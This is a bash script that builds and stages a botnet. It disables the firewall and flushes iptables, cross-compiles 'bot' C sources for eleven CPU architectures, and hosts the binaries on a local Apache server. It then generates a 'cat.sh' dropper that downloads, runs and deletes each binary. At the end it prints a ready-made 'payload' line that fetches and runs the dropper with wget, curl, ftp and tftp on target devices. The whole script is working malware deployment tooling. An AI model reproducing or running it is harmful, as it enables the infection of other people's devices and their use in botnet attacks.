#!/bin/bash
ufw disable
cd bot
apt upgrade
apt update -y
apt install gcc -y
apt install curl -y

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT


#setup http server if not installed

apt-get install apache2 -y

service apache2 start

# install ubuntu cross compilers (not recommended)
apt install gcc-powerpc64-linux-gnu -y
apt install gcc-mips-linux-gnu -y
apt install gcc-mipsel-linux-gnu -y
apt install gcc-sparc64-linux-gnu -y
apt install gcc-arm-linux-gnueabi -y
apt install gcc-aarch64-linux-gnu -y
apt install gcc-m68k-linux-gnu -y
apt install gcc-i686-linux-gnu -y
apt install gcc-arm-linux-gnueabihf -y
apt install gcc-sh4-linux-gnu -y

powerpc64-linux-gnu-gcc *.c -o powerpc64 -pthread -DARCH_powerpc64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
mips-linux-gnu-gcc *.c -o mips -pthread -DARCH_mips -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
mipsel-linux-gnu-gcc *.c -o mipsel -pthread -DARCH_mipsel -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
sparc64-linux-gnu-gcc *.c -o sparc -pthread -DARCH_sparc -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
arm-linux-gnueabi-gcc *.c -o arm -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
aarch64-linux-gnu-gcc *.c -o aarch64 -pthread -DARCH_aarch64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
m68k-linux-gnu-gcc *.c -o m68k -pthread -DARCH_m68k -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
i686-linux-gnu-gcc *.c -o i686 -pthread -DARCH_i686 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
arm-linux-gnueabihf-gcc *.c -o armhf -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
x86_64-linux-gnu-gcc *.c -o x86_64 -pthread -DARCH_x86_64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99

#move binaries to apache2 dir
mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html

cd ..

IP=$(curl -s ifconfig.me)
cat <<EOF >/var/www/html/cat.sh
#!/bin/bash
wget http://$IP/x86_64;
curl http://$IP/x86_64 -o x86_64;
chmod 777 x86_64;
chmod +x x86_64;
./x86_64;
rm -rf x86_64;
wget http://$IP/aarch64;
curl http://$IP/aarch64 -o aarch64;
chmod 777 aarch64;
chmod +x aarch64;
./aarch64;
rm -rf aarch64;
wget http://$IP/armhf;
curl http://$IP/armhf -o armhf;
chmod 777 armhf;
chmod +x armhf;
./armhf;
rm -rf armhf;
wget http://$IP/arm;
curl http://$IP/arm -o arm;
chmod 777 arm;
chmod +x arm;
./arm;
rm -rf arm;
wget http://$IP/i686;
curl http://$IP/i686 -o i686;
chmod 777 i686;
chmod +x i686;
./i686;
rm -rf i686;
wget http://$IP/m68k;
curl http://$IP/m68k -o m68k;
chmod 777 m68k;
chmod +x m68k;
./m68k;
rm -rf m68k;
wget http://$IP/mips;
curl http://$IP/mips -o mips;
chmod 777 mips;
chmod +x mips;
./mips;
rm -rf mips;
wget http://$IP/mipsel;
curl http://$IP/mipsel -o mipsel;
chmod 777 mipsel;
chmod +x mipsel;
./mipsel;
rm -rf mipsel;
wget http://$IP/powerpc64;
curl http://$IP/powerpc64 -o powerpc64;
chmod 777 powerpc64;
chmod +x powerpc64;
./powerpc64;
rm -rf powerpc64;
wget http://$IP/sparc;
curl http://$IP/sparc -o sparc;
chmod 777 sparc;
chmod +x sparc;
./sparc;
rm -rf sparc;
wget http://$IP/sh4;
curl http://$IP/sh4 -o sh4;
chmod 777 sh4;
chmod +x sh4;
./sh4;
rm -rf sh4;
/var/wii 2>/dev/null &
EOF

echo "DONE COMPILING BOT, BINS IN /var/www/html"
echo "THIS COMPILER IS NOT RECOMMENDED"
echo "Your payload is: wget http://$IP/cat.sh; curl http://$IP/cat.sh -o cat.sh; ftp http://$IP/cat.sh; tftp $IP -c get cat.sh; sh cat.sh; bash cat.sh;"
echo "if ur port aint default 80 its not my problem do it manually urself thats just too much work for me, if you dont know what this is and just got a fresh vps you can ignore this message"

exit 0
